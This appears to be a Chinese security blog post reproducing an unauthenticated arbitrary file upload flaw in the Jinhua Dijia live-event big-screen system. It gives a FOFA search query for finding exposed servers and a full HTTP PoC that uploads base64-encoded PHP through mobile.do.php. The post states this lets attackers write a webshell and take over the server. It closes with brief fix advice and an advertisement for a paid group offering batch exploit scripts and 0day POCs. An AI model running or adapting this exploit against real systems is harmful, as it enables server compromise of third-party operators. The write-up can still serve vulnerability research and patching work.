#  「漏洞复现」金华迪加 现场大屏互动系统 mobile.do.php 任意文件上传漏洞   
冷漠安全  冷漠安全   2024-11-17 03:16  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0pFeDPJNnYaE7pYibBLQrUbLZwqelcotCqhYf0seBKfHroSUm8XuHyka5I3SmicWcJYUpZbFmxJCZ1Q/640?wx_fmt=gif&from=appmsg "")  
  
**0x01 免责声明**  
  
**免责声明**  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。工具来自网络，安全性自测，如有侵权请联系删除。本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！！！  
  
0x02  
  
**产品介绍**  
  
金华迪加现场大屏互动系统是一种集成了先进技术和创意设计的互动展示解决方案，旨在通过大屏幕和多种交互方式，为观众提供沉浸式的互动体验。该系统广泛应用于各类活动、展览、会议等场合，能够显著提升现场氛围和参与者的体验感。  
  
0x03  
  
**漏洞威胁**  
  
金华迪加 现场大屏互动系统 mobile.do.php 存在任意文件上传漏洞，未经身份验证远程攻击者可利用该漏洞代码执行，写入WebShell,进一步控制服务器权限。  
  
0x04  
  
**漏洞环境**  
  
FOFA:  
```
body="/wall/themes/meepo/assets/images/defaultbg.jpg" || title="现场活动大屏幕系统"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0o9NWW5FsVlEaK8OzcqHD7wDVT4hXIdqf0SJyn7Wo4dxpBaHNtKB3y9Fxmv3aH02ribC9jdhVtG8IA/640?wx_fmt=png&from=appmsg "")  
  
  
0x05  
  
**漏洞复现**  
  
PoC  
```
POST /mobile/mobile.do.php?action=msg_uploadimg HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Connection: close


filetype=php&imgbase64=PD9waHAgcHJpbnQoMTExKjIyMik7dW5saW5rKF9fRklMRV9fKTs/Pg==
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0o9NWW5FsVlEaK8OzcqHD7w7ZPxWicdwxrG1oS13opIqmbtMJuJic738T5eeEia4IwasM1X2ecRqibQSg/640?wx_fmt=png&from=appmsg "")  
  
回显了完整路径，验证  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0o9NWW5FsVlEaK8OzcqHD7wB9AoMshYOBllvJEmKaaaJm2rwyJibErZqkv5UTwmHQWJThKUT8NRBNw/640?wx_fmt=png&from=appmsg "")  
  
  
0x06  
  
**批量脚本验证**  
  
Nuclei验证脚本已发布  
知识星球：冷漠安全  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0o9NWW5FsVlEaK8OzcqHD7wHNG9gjoiaSxcgGKDP9uqOs1g0lrGwqNnp23nBmBYfMLcqdSYQ5YYgNg/640?wx_fmt=png&from=appmsg "")  
  
  
0x07  
  
**修复建议**  
  
关闭互联网暴露面或接口设置访问权限  
  
升级至安全版本  
  
0x08  
  
**加入我们**  
  
漏洞详情及批量检测POC工具请前往知识星球获取  
  
知识星球：冷漠安全交个朋友，限时优惠券：加入立减25星球福利：每天更新最新漏洞POC、资料文献、内部工具等  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0o9NWW5FsVlEaK8OzcqHD7wy6r36EvEUuUl010LO9RZtHSAnNVX01nuc007ibQIeXwhMUMXU3QXjvA/640?wx_fmt=png&from=appmsg "")  
  
  
「星球介绍」：  
  
本星球不割韭菜，不发烂大街东西。欢迎进来白嫖，不满意三天退款。  
  
本星球坚持每天分享一些攻防知识，包括攻防技术、网络安全漏洞预警脚本、网络安全渗透测试工具、解决方案、安全运营、安全体系、安全培训和安全标准等文库。  
  
本星主已加入几十余个付费星球，定期汇聚高质量资料及工具进行星球分享。  
  
  
「星球服务」：  
  
  
加入星球，你会获得：  
  
  
♦ 批量验证漏洞POC脚本  
  
  
♦ 0day、1day分享  
  
  
♦ 汇集其它付费星球资源分享  
  
  
♦ 大量的红蓝对抗实战资源  
  
  
♦ 优秀的内部红蓝工具及插件  
  
  
♦ 综合类别优秀Wiki文库及漏洞库  
  
  
♦ 提问及技术交流  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0o9NWW5FsVlEaK8OzcqHD7wXt4nsKZmEwU9zMxickFLjmTCGJR4OH8gMpejc48qINtCTLM06Mwbviaw/640?wx_fmt=gif&from=appmsg "")  
  
  
